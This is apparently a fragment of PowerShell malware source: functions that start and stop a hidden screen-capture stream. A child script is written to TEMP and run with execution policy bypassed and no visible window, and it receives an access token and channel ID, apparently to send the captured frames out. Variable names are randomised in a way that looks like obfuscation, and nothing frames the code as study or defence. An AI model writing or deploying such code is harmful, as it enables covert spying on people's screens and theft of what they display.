function Start-CaptureStream {
    param([int]$Fps = 1, [int]$Quality = 60, [int]$MaxSeconds = 0, [int]$Monitor = 0)
    if ($script:capturePid) {
        $ODAUqj = Get-Process -Id $script:capturePid -EA SilentlyContinue
        if ($ODAUqj) { return "already running (PID $($script:capturePid))" }
        $script:capturePid = $null
    }
    Remove-Item -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
    Remove-Item -LiteralPath $script:captureErrFile  -Force -EA SilentlyContinue

    $McGjS6l7 = Join-Path $env:TEMP "dag_cap_$([guid]::NewGuid().ToString('N')).ps1"
    [System.IO.File]::WriteAllText($McGjS6l7, $script:CaptureChildCode, $script:utf8NoBom)

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName  = $script:psExe
    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$McGjS6l7`""
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow  = $true
    $psi.WindowStyle     = "Hidden"
    $psi.EnvironmentVariables["DAG_TOKEN"]    = $script:token
    $psi.EnvironmentVariables["DAG_CHANNEL"]  = $script:channelId
    $psi.EnvironmentVariables["DAG_FPS"]      = "$Fps"
    $psi.EnvironmentVariables["DAG_QUALITY"]  = "$Quality"
    $psi.EnvironmentVariables["DAG_MAXSEC"]   = "$MaxSeconds"
    $psi.EnvironmentVariables["DAG_MONITOR"]  = "$Monitor"
    $psi.EnvironmentVariables["DAG_KILLFILE"] = $script:captureKillFile
    $psi.EnvironmentVariables["DAG_ERRLOG"]   = $script:captureErrFile

    try {
        $nHVqb = [System.Diagnostics.Process]::Start($psi)
        $script:capturePid   = $nHVqb.Id
        $script:captureStart = Get-Date
        "$($nHVqb.Id)" | Set-Content -LiteralPath $script:capturePidFile -Force -EA SilentlyContinue
        $FKVBz = if ($MaxSeconds -le 0) { "inf" } else { "${MaxSeconds}s" }
        return "PID $($nHVqb.Id) | fps=$Fps q=$Quality max=$FKVBz mon=$Monitor"
    } catch {
        return "spawn fail: $_"
    }
}

function Stop-CaptureStream {
    if (-not $script:capturePid) {
        if (Test-Path -LiteralPath $script:capturePidFile) {
            try { $script:capturePid = [int](Get-Content -LiteralPath $script:capturePidFile -Raw) } catch { }
        }
        if (-not $script:capturePid) { return "not running" }
    }
    $vtyTjfA = $script:capturePid
    "stop" | Set-Content -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
    Start-Sleep -Milliseconds 700
    $ODAUqj = Get-Process -Id $vtyTjfA -EA SilentlyContinue
    if ($ODAUqj) { try { & taskkill.exe /F /T /PID $vtyTjfA 2>&1 | Out-Null } catch { try { $ODAUqj.Kill() } catch {} } }
    $script:capturePid   = $null
    $script:captureStart = $null
    Remove-Item -LiteralPath $script:capturePidFile -Force -EA SilentlyContinue
    Remove-Item -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
    return "stopped PID $vtyTjfA"
}

